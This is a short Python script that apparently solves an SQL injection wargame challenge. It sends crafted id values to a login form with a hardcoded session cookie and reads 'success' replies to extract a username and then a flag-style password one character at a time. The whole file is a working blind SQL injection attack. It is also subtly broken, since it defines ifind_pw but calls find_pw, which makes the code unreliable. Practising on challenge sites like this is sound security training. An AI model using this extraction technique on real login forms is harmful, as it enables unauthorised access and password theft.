import requests
cookie = {'PHPSESSID':'8vpudddei09nemstn3il2qho63'}

def my_request(uid):
	url = "https://p.rubiya.kr/sqli2/"
	param = {
		'id': uid,
		'pw': '1'
	}
	response = requests.post(url,data=param,cookies=cookie)
	return response


def find_id():
	res= ""
	for num in range(0,6):
		for ch in range(48,255):
			if ch == 71:
				continue
			uid = f"\' or id like \'" + res + chr(ch) +"%\'#"
			response = my_request(uid)
			if "success" in response.text:
				res += chr(ch)
				break
	print("I got id:",res)
	return res


def ifind_pw(key):
	res = "FLAG"
	cnt = 4
	for num in range(0,21):
		cnt += 1
		for ch in range(21,255):
			uid = f"{key}\' and left(pw,{cnt}) = \'" + res + chr(ch) +"\'#"
			response = my_request(uid)
			if "success" in response.text:
				res += chr(ch)
				break

	print("I got pw:",res)

if __name__ == "__main__":
	res = find_id()
	find_pw(res)
